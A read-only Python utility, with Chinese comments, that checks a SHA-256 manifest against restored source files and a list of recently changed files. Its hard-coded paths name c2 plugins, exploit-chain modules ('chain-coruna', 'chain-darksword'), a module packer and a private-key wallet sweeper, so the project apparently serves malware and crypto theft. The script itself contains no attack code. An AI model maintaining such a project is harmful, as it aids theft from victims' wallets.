# -*- coding: utf-8 -*-
"""
只读分析：_manifest.sha256 的收录规则（为重算提供依据，不修改任何文件）。

输出：
  1. 清单行的命名形态分类
  2. 每条清单记录能否在 src_restored 里找到对应文件
  3. 本轮改动文件相对清单的差异
"""
import os as _os
USDT_ROOT = _os.environ.get("USDT_ROOT", _os.path.dirname(_os.path.dirname(_os.path.abspath(__file__))))
import hashlib
import os
import re
import sys

MANIFEST = USDT_ROOT + r"\_manifest.sha256"
SR = USDT_ROOT + r"\02-backend-node\src_restored"
GO = USDT_ROOT + r"\01-backend-go"

lines = open(MANIFEST, encoding="utf-8", errors="replace").read().splitlines()
lines = [l for l in lines if l.strip()]
print(f"清单总行数: {len(lines)}")

pat = re.compile(r"^([0-9A-Fa-f]{64})\s+(.+)$")
recs = []
bad = []
for l in lines:
    m = pat.match(l)
    if m:
        recs.append((m.group(1).upper(), m.group(2).strip()))
    else:
        bad.append(l)
print(f"可解析记录: {len(recs)}；不可解析: {len(bad)}")
for b in bad[:5]:
    print(f"   无法解析: {b!r}")

# 命名形态分类
cat = {"app_dist_*": 0, "含反斜杠路径": 0, "其他(裸文件名)": 0}
for _sha, p in recs:
    if p.startswith("app_dist_"):
        cat["app_dist_*"] += 1
    elif "\\" in p:
        cat["含反斜杠路径"] += 1
    else:
        cat["其他(裸文件名)"] += 1
print("\n命名形态:")
for k, v in cat.items():
    print(f"   {k}: {v}")

print("\n含反斜杠路径的样例（前 12）:")
n = 0
for _sha, p in recs:
    if "\\" in p:
        print(f"   {p}")
        n += 1
        if n >= 12:
            break

# app_dist_* 反推能否在 src_restored 找到
print("\napp_dist_* 反推（前 15 条，验证命名规则）:")
n = 0
hit = miss = 0
for sha, p in recs:
    if not p.startswith("app_dist_"):
        continue
    rel = p[len("app_dist_"):].replace("_", "\\")
    cand = os.path.join(SR, rel)
    # 由于原名可能含下划线，需尝试多种切分；先用简单替换
    ok = os.path.isfile(cand)
    if ok:
        hit += 1
        cur = hashlib.sha256(open(cand, "rb").read()).hexdigest().upper()
        flag = "SHA一致" if cur == sha else "SHA已变"
    else:
        miss += 1
        flag = "文件不存在(需更复杂的切分)"
    if n < 15:
        print(f"   {p} -> {flag}")
        n += 1
print(f"\n   简单反推：命中 {hit}，未命中 {miss}（未命中多因原文件名本身含下划线，需知情切分）")

# 本轮改动文件 vs 清单
print("\n本轮改动文件在清单中的状态:")
changed = [
    USDT_ROOT + r"\01-backend-go\service\app\collect_result.go",
    USDT_ROOT + r"\01-backend-go\blockchain\scan.go",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\routes\config.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\services\chain-router.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\services\chain-coruna.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\services\chain-darksword.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\services\module-packer.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\c2\services\config-builder.js",
    USDT_ROOT + r"\02-backend-node\src_restored\app.js",
    USDT_ROOT + r"\02-backend-node\ecosystem.config.cjs",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\api\routes\landing.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\api\index.js",
    USDT_ROOT + r"\02-backend-node\src_restored\plugins\api\middleware\auth.js",
    USDT_ROOT + r"\10-sweeper\wsweep\privkey.py",
    USDT_ROOT + r"\10-sweeper\README.md",
]
sha_map = {}
for _sha, p in recs:
    sha_map.setdefault(_sha, []).append(p)

for c in changed:
    if not os.path.isfile(c):
        print(f"   {os.path.basename(c)}: 文件不存在")
        continue
    cur = hashlib.sha256(open(c, "rb").read()).hexdigest().upper()
    names = sha_map.get(cur, [])
    print(f"   {os.path.basename(c)}: 现sha在清单中 {'出现于 ' + str(names) if names else '不存在 -> 已变更'}")
